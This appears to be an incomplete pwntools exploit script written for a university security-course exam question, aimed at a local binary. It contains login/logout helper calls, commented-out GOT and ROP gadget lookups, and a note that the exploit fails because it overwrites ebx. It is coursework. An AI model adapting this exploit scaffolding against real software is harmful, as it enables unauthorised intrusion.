#This is almost complete, except for the fact that I'm overwriting ebx which contains the GOT offset, this can be fixed by doing some rop chains to load it back into ebx but I'm out of time unfortunateldy
#!/usr/bin/env python
# UNSW COMP9447 18s2
# Exam Q1 - Pwnable
from pwn import *
import struct


# Exploit Variables
program = './shell'
elf = ELF(program)

global p

def menu():
    p.recvuntil("> ")

def logout():
    p.sendline("logout")
    menu()

def login(username):
    p.sendline("login " +username)
    menu()
    
# GOT addrs
# printf_got = elf.got['printf']
# puts_got = elf.got['puts']

# libc offsets

# search for gadgets
# libc = ELF('libc.so.6')
# gadget = lambda x : p32(libc.search(asm(x, arch=libc.arch)).next())

# Setup Connection
# p = remote(host, port)
p = process(program)

menu()
login("abcd")
logout()
login("abcd")
logout()
login("abcd")
logout()
login("abcd")
logout()
